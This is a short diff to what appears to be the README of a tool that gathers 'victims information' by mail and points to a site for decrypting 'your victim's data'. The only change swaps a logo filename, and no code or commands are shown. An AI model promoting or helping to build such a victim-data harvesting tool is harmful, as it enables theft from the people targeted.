@@ -48,7 +48,7 @@ Get Victims Information Recived Your Mail
 ![Logo](1660103072231_100.PNG)
 - Go To Our Encrypt Decrypt Site Now Decrypt Your Victim’s Data
 <a href="http://ex-encryptor.eu5.org/">EX Encrypt</a>
-![Logo](1660103072231_100.PNG)
+![Logo](1660103084593_100.PNG)
 
 
 
